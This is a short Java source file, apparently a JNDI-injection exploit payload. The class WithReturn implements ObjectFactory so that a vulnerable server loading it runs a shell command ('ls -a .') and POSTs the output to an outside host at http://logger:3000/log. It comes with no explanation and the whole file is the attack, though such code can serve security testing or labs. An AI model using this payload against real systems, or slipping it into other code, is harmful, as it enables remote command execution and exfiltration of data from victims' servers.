
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Hashtable;
import java.lang.Process;
import java.util.stream.Collectors;

public  class WithReturn implements  ObjectFactory  {
    @Override
    public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {
        String[] cmd = {
            "/bin/sh",
            "-c",
            "ls -a ."
        };

        Process p = Runtime.getRuntime().exec(cmd);
        p.waitFor();

        BufferedReader stream = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String stdout = stream.lines().collect(Collectors.joining("\n"));

        System.out.println("Test");

        URL url = new URL("http://logger:3000/log");
        HttpURLConnection con = (HttpURLConnection) url.openConnection();
        con.setDoOutput(true);
       // con.setRequestProperty("Content-Type", "application/json; charset=utf-8");
        con.setRequestMethod("POST");

        OutputStreamWriter writer = new OutputStreamWriter(con.getOutputStream());
        writer.write(stdout);
        writer.flush();


     System.out.println(con.getResponseCode());

        return  null;
    }
}